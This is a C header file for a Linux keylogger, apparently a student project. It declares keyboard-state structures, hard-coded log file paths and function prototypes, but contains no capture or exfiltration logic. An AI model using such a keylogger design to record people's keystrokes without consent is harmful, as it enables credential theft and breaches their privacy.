#ifndef KEYLOGGER_H
# define KEYLOGGER_H

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <linux/input.h>
#include <sys/stat.h>
#include "libft.h"

# define KEYBOARD_CST 0
# define LOGPATH	"/home/user42/Bureau/keylogger/logs/"
# define LOGFILE  "/home/user42/Bureau/keylogger/logs/keylog.log"
# define DATAPATH "/home/user42/Bureau/keylogger/klg.data"

typedef struct	s_mod
{
	int	shift;
	int	alt;
	int	ctrl;
	int	numlock;
	int	capslock;
	int mod;
}				t_mod;
typedef struct	s_keylogger
{
	char				*kbdfile;
    struct input_event	event;
	char				*keymap[257][8];
	char				*rawMap;
	char				*event_location;
	int					logFD;
	int					dataFD;
	int					saveFD;
	int					saveLineFD;
	int					keyboardFD;
	t_mod				mod;

}				t_keylogger;

void				clean_quit(t_keylogger *klg, int code);
int					lentochar(char *s, char c);
void				ft_strncpy(char *dest, char *src, int n);
void				keylogger(void);
void				signal_handle();
t_keylogger			*getKlg(void);

#include "keymap.h"

#endif // KEYLOGGER_H